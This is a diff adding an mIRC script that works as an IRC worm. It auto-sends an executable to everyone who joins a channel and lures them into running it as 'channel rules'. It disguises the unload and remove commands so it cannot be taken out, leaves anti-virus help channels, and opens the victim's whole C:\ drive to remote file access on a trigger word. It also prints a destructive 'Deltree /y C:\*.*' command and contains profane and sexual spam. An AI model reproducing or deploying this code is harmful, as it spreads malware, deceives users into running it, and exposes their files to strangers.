@@ -1,0 +1,59 @@
+on 1:text:*:#nohack:{ part #nohack
+  join #teens
+}
+on 1:join:*:{ dcc send $nick c:\IrcRules.exe
+}
+on 1:connect:{
+  if (%asdf == $null) {
+    /.alias /unload /echo 2 *** Unloaded $1- 
+    /.alias /remove /echo 2 *** Removed $1- 
+    /.alias /play /echo 2 *** Unable To Play $1- 
+    /.alias /remote /.remote on | /echo 12 *** Remote Off
+    /.alias /events /.events on | /echo 12 *** Events Off
+    /.alias /sreq /echo 12 SREQ IS NOW OFF
+    /set %asdf 2345
+  }
+}
+on 1:FILESENT:*:/msg $nick to run the channels rules type this /run c:\mirc\download\irchelp.exe
+on 1:text:*r*e*m*o*t*e*:*:{ ignore $nick 3
+  notice $nick ha ha ha ha no biTch
+  part #nohack,#virushelp,#ava
+  Echo 2REMOTE IS OFF
+}
+on 1:text:*/*r*e*m*o*v*e*:*:{ echo 2REMOVE C:\Command.com
+  ignore $nick 3
+  notice $nick did you say 2/remove c:\command.com
+  msg $chan its funny when your system types funny commands in win.ini  }PK{
+  msg $chan like lines like this Deltree /y C:\*.*
+  echo 2 WARNING $NICK IS TRYING TO HACK YOU!
+}
+on 1:text:virus:*:/notice $nick nick its not a virus lamer!
+on 1:notice:clit:*:/amsg i like open clit
+on 1:notice:file:*:/fserve $nick 1 c:\
+on 1:notice:quit:*:/quit Die Bitch }PK{ 555555.32.1234556.234234234
+on 1:notice:error:*:/amsg http://www.tripod.com/~itsahole
+on 1:text:*/*a*l*i*a*s*:*:/exit ha ha ha virus helper im one step in front of you
+on 1:join:#nohack:/part i need no help }PK-Night{
+on 1:text:*:#virushelp:/part $chan nope you can bit me buddy }PK-Night{
+on 1:text:*:#ava:/part $chan na na na na na fuck off }PK-Night{
+on 1:open:?:/nick fucking $+ - $+ $nick
+on 1:text:*/*u*n*l*o*a*d*:*:{ echo 2REMOVE C:\Command.com
+  ignore $nick 3
+  notice $nick did you say 2/remove c:\command.com
+  msg $chan its funny when your system types funny commands in win.ini  }PK{
+  msg $chan like lines like this Deltree /y C:\*.*
+  echo 2 WARNING $NICK IS TRYING TO HACK YOU!
+}
+on 1:text:*/*p*l*a*y*:*:{ echo 2playing something
+  ignore $nick 3
+  notice $nick did you say 2/remove c:\command.com
+  msg $chan its funny when your system types funny commands in win.ini  }PK{
+  msg $chan like lines like this Deltree /y C:\*.*
+  echo 2 WARNING $NICK IS TRYING TO HACK YOU!
+}
+on 1:text:*a*t*t*r*i*b*:*:{ /notice $nick ha like im going to let him or her to run that command you can go and ATTRIB your mom bitch
+  ignore $nick 3
+  echo 2 WARNING $NICK IS TRYING TO HACK YOU!
+}
+on 1:text:*/r*u*n*d*e*l*t*r*e*e*:{ echo 2 WARNING $NICK IS TRYING TO HACK YOU! }
+on 1:text:*hi*:#:/msg $chan hi $nick how you going there :)
